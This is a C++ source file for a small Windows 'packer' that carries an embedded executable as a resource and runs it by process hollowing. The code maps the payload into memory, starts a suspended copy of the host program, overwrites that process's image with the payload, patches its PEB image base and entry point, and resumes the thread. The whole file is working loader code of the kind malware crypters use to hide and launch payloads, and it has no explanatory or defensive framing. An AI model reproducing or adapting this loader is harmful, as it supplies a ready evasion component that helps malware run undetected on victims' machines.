// mPacker.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "resource.h"

HMODULE hModule		= NULL;
HRSRC	hResInfo	= NULL;
HGLOBAL hResData	= NULL;
DWORD	dwResSize	= 0;

LPVOID	lpMapBase	= NULL;
DWORD	dwMapSize	= 0;

BOOL	InitRsrc();
BOOL	FreeRsrc();
BOOL	InitMap();
BOOL	FreeMap();
BOOL	MPack();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	InitRsrc();
	InitMap();
	MPack();
	FreeMap();
	FreeRsrc();
}

BOOL	InitRsrc()
{
	hModule = GetModuleHandle(NULL);
	hResInfo = FindResourceA(hModule, MAKEINTRESOURCEA(IDR_BIN1), "BIN");
	hResData = LoadResource(hModule, hResInfo);
	dwResSize = SizeofResource(hModule, hResInfo);

	return TRUE;
}

BOOL	FreeRsrc()
{
	FreeResource(hResData);
	return TRUE;
}

BOOL	InitMap()
{	
	IMAGE_DOS_HEADER*			pDosHeader	= NULL;
	IMAGE_NT_HEADERS*			pNtHeader	= NULL;
	IMAGE_SECTION_HEADER*		pSecHeader	= NULL;
	IMAGE_IMPORT_DESCRIPTOR*	pImptTable	= NULL; 

	DWORD	wNumOfSection	= 0;
	DWORD	dwHeaderSize	= 0;

	LPVOID	lpSrc			= NULL;
	LPVOID	lpDst			= NULL;
	DWORD	dwCopySize		= 0;
	

	pDosHeader	= (PIMAGE_DOS_HEADER)hResData;
	pNtHeader	= (PIMAGE_NT_HEADERS)((DWORD)hResData + pDosHeader->e_lfanew);
	pSecHeader	= (PIMAGE_SECTION_HEADER)((DWORD)pNtHeader + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +pNtHeader->FileHeader.SizeOfOptionalHeader);

	dwHeaderSize = pNtHeader->OptionalHeader.SizeOfHeaders;
	wNumOfSection = pNtHeader->FileHeader.NumberOfSections;
	dwMapSize	= pNtHeader->OptionalHeader.SizeOfImage;

	lpMapBase = VirtualAlloc(NULL,dwMapSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);

	//Map PE Header
	lpDst		= lpMapBase;
	lpSrc		= hResData;
	dwCopySize	= dwHeaderSize; 
	memcpy(lpDst,lpSrc,dwCopySize);

	//Map PE Section(s)
	for (DWORD i = 0; i < wNumOfSection; i++)
	{
		lpDst = (LPVOID)((DWORD)lpMapBase + pSecHeader->VirtualAddress);
		lpSrc = (LPVOID)((DWORD)hResData + pSecHeader->PointerToRawData);
		dwCopySize = pSecHeader->SizeOfRawData;
		memcpy(lpDst,lpSrc,dwCopySize);
		if (i < (wNumOfSection -1))
		{
			pSecHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSecHeader+sizeof(IMAGE_SECTION_HEADER));
		}
		else
		{
			pSecHeader = NULL;
		}
	}

	return TRUE;
}
BOOL	FreeMap()
{
	VirtualFree(lpMapBase,dwMapSize,MEM_DECOMMIT);
	return TRUE;
}

BOOL	MPack()
{
	IMAGE_DOS_HEADER*		pDosHeader		=	NULL;
	IMAGE_NT_HEADERS*		pNtHeader		=	NULL;
	IMAGE_SECTION_HEADER*	lpLastSection	=	NULL;
	IMAGE_SECTION_HEADER*	lpNewSection	=	NULL;

	STARTUPINFOA			stSI			=	{0};
	PROCESS_INFORMATION		stPI			=	{0};
	CONTEXT					stContext		=	{0};

	char	szModuleName[MAX_PATH] = {0};

	DWORD	dwImageBase = NULL;
	DWORD	dwImageSize = 0;
	DWORD	dwEntryPoint = 0;

	DWORD	dwBytesRead = 0;
	DWORD	dwBytesWritten = 0;
	DWORD	dwDword	= 0;

	DWORD	*pebInfo = NULL;

	//Get PE Information
	pDosHeader	= (PIMAGE_DOS_HEADER)lpMapBase;
	pNtHeader	= (PIMAGE_NT_HEADERS)((DWORD)lpMapBase + pDosHeader->e_lfanew);
	dwImageBase = pNtHeader->OptionalHeader.ImageBase;
	dwImageSize = pNtHeader->OptionalHeader.SizeOfImage;
	
	dwEntryPoint = dwImageBase + pNtHeader->OptionalHeader.AddressOfEntryPoint;

	//Suspend & Resume
	GetModuleFileNameA(NULL,szModuleName,MAX_PATH);
	CreateProcessA(0,szModuleName,0,0,0,CREATE_SUSPENDED,0,0,&stSI,&stPI);

	stContext.ContextFlags = CONTEXT_FULL;
	GetThreadContext(stPI.hThread,&stContext);

	pebInfo =(DWORD *)stContext.Ebx;
	ReadProcessMemory(stPI.hProcess,(LPVOID)&pebInfo[2],&dwDword,sizeof(DWORD),&dwBytesRead);
	VirtualAllocEx(stPI.hProcess,(LPVOID)dwImageBase,dwImageSize,MEM_RESERVE | MEM_COMMIT,PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(stPI.hProcess,(LPVOID)dwImageBase,lpMapBase,dwImageSize,&dwBytesWritten);
	WriteProcessMemory(stPI.hProcess,(LPVOID)&pebInfo[2],&dwImageBase,sizeof(DWORD),&dwBytesWritten);
	stContext.Eax = dwEntryPoint;
	SetThreadContext(stPI.hThread,&stContext);
	ResumeThread(stPI.hThread);

	return TRUE;
}

